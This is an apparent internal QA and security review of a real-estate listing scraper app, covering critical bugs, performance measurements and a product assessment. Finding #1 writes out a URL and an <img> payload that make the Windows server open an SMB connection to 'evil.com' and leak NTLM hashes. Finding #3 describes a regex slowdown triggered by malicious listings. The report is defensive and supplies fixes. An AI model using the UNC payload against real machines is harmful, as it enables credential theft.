CRITICAL
=====================================================================================

#1  Any website can make HomeSweeper open a network (SMB) connection to a server it picks
    Where: Scraper/Server.py, the static mount at the end: app.mount("/", StaticFiles(...))
    What:  On Windows, a URL like  /%5c%5cevil.com%5cshare%5cx  becomes  \\evil.com\share\x.
           Starlette's StaticFiles does os.path.join(UI_DIR, path) (which returns the UNC path,
           dropping UI_DIR) and then os.path.realpath() on it BEFORE its "inside the folder" check.
           realpath opens the path, so Windows connects over SMB to evil.com and can send the
           agent's NTLM password hash. A plain <img src="http://127.0.0.1:8000/%5c%5cevil.com%5cx">
           on any website the agent visits is enough: a GET passes the Host check (Host is 127.0.0.1).
    Also a DoS: each request holds a worker thread ~40 s; 45 of them froze every API call for ~40 s.
    Evidence: normal 404 = 0.003 s; UNC to 127.0.0.1 = 2.1 s; UNC to unroutable 10.255.255.1 = 42 s.
              Server log: FileNotFoundError [WinError 53] The network path was not found:
              '\\\\10.255.255.35\\s\\x'
    Fix:   a middleware (or a StaticFiles subclass overriding get_path) that answers 404 for any
           request path containing "\", ":" or a NUL byte, before the static mount sees it. Example:

             @app.middleware("http")
             async def no_windows_paths(request, call_next):
                 path = request.url.path
                 if "\\" in path or ":" in path or "\x00" in path:
                     return JSONResponse({"detail": "Not Found"}, status_code=404)
                 return await call_next(request)

           Retest: GET /%5c%5c10.255.255.1%5cs%5cx must answer 404 in milliseconds.
           Also fixes the 500 on "/app.js%00.html" (null byte).

#2  The Excel export becomes unusable after a few thousand listings (quadratic)
    Where: Scraper/Output.py, append_row() (around line 95)
    What:  after each sheet.append() it reads sheet[sheet.max_row]; openpyxl's max_row/max_column
           scan every cell, so building the workbook is O(rows^2).
    Evidence: build_workbook 500 rows 1.2 s, 2,000 rows 29 s, 5,000 rows 63 s, 20,000 rows > 5 min
              (the UI download never finished). The per-turn Output/listings.xlsx (save_listings,
              called 4x per turn) took 5.1 s to append 50 rows to a 5,000-row file, and keeps growing.
    Fix (tested: 20,000 rows in 7.9 s, formula injection still blocked):

             def append_row(sheet, values):
                 sheet.append(values)
                 row = sheet._current_row  #The row append() just wrote, no scan of the sheet
                 for column, value in enumerate(values, start=1):
                     if isinstance(value, str) and value.startswith("="):
                         sheet.cell(row=row, column=column).data_type = "s"

           Also decide whether the per-turn Output/listings.xlsx is still needed (NOTES to-do 9);
           it loads the whole growing file 4 times per turn.

#3  One malicious listing can slow down every agent's app (quadratic regex)
    Where: Scraper/Search.py CENTER_TAG (line ~35) and Scraper/Derive.py CENTER_DISTANCE (line ~125)
    What:  \d+(?:[.,]\d+)?\s*k?m... restarts at every digit of a long digit run -> O(n^2).
           Runs on every listing on every cache rebuild and every search. All agents scrape the same
           public sites, so one seller posting a description full of digits hits everyone.
    Evidence: 2,000 digits 0.09 s, 4,000 0.36 s, 8,000 1.44 s (x4 per doubling).
    Fix (tested: 200,000 digits in 0.012 s, same matches on "2.4km nga qendra, 982m nga qendra"):
           add a lookbehind so a match can't start in the middle of a number:
             CENTER_TAG      = re.compile(r"(?<![\d.,])\d+(?:[.,]\d+)?\s*k?m\s+nga\s+qendra")
             CENTER_DISTANCE = re.compile(r"(?<![\d.,])(\d+(?:[.,]\d+)?)\s*(km|m)\s+nga\s+qendra")

#4  "Send every listing to the browser" doesn't scale (measured at 20,000 listings)
    - /api/listings: 46 MB JSON (10 MB gzipped), 1.7-2.4 s on the server
    - first cards in the browser after 7.5 s
    - the UI freezes 4.8 s after EVERY finished turn (loadListings reloads everything)
    - server process uses 621 MB RAM (157 MB with 220 listings)
    - AI near-miss search (POST /api/ai/search, few results): 12.9 s
      typical best_match search: 3.8 s
      Cause: score() calls searchable_text() again for every listing in sort_listings("best_match"),
      match_reasons() does it again, and near_misses ranks ALL candidates to return 12.
    - With 5 blocked sellers, /api/listings went from 2.4 s to 4.6 s (phone_keys regex per listing per request)
    Fix: slim list endpoint (card fields only) + /api/listings/{id} + ?since= for new rows
         (REVIEW.md roadmap #10); cache searchable_text per listing in the listings cache; in
         near_misses only rank what is returned. Agents will reach these sizes in weeks of
         continuous scraping.
    Note: the dashboard filters themselves are fine at 20k (render() 60-160 ms).

#5  "Jo agjenci" / private-seller filter can't be trusted yet
    - MerrJep: posted_by = "Kompani" on all 55 listings (bug B2, still open).
    - Njoftime: 48 of 55 marked Kompani by the name/logo guess (mostly right on the data seen;
      "Ina FutureHome" slips through as private because \bhomes?\b needs a word start).
    For agents, finding private sellers is the main point of the product.

=====================================================================================
PRODUCT ASSESSMENT
=====================================================================================
As a customer (real estate agent):
- Real value: four sites in one place, phone numbers, Albanian AI search, block sellers, Excel.
- Friction:
  - Tall cards in a sideways strip show ~3 listings per screen (REVIEW.md #14: grid + compact card).
  - On a phone the header takes ~250 px; the first listing is below the fold.
  - Operator controls (break, schedule, agency preference) sit in the agent's face (REVIEW.md #15).
  - The AI setup note tells agents to edit Data/anthropic_api_key.txt - not for non-technical users.
  - Errors say "Shiko konsolën e serverit" - agents have no console.
  - "Mbledhja e fundit" shows only a time.
- What agents would pay more for: "new since yesterday" alerts, price-drop tracking,
  merging the same flat posted on several sites, export of the filtered set only.

As a business:
- Agents in one office share one public IP. Five copies scraping the same four sites from one IP
  is the most likely way to get blocked. Stagger them, or plan a central scraper later.
- Legal check needed: storing private sellers' names and phone numbers falls under Albania's
  personal data protection law; each site has its own terms of use.
- AI cost: worst case ~$60 per agent per month at the $2/day cap. Build it into the price.
- Still undecided: the AI needs a key and contacts Anthropic, which contradicts "nothing phones home"
  and "no licence keys" in CLAUDE.md -> Product architecture.
- Owner installs on every PC: fine for ~20 agents, doesn't scale beyond that (code signing then needed).

As an engineer / QA:
- Scraper code copied four times (~560 lines each); app.js over 2,000 lines; all scraper state in
  module globals; everything derived at read time.
- No automated tests - every bug above would only be found by hand.
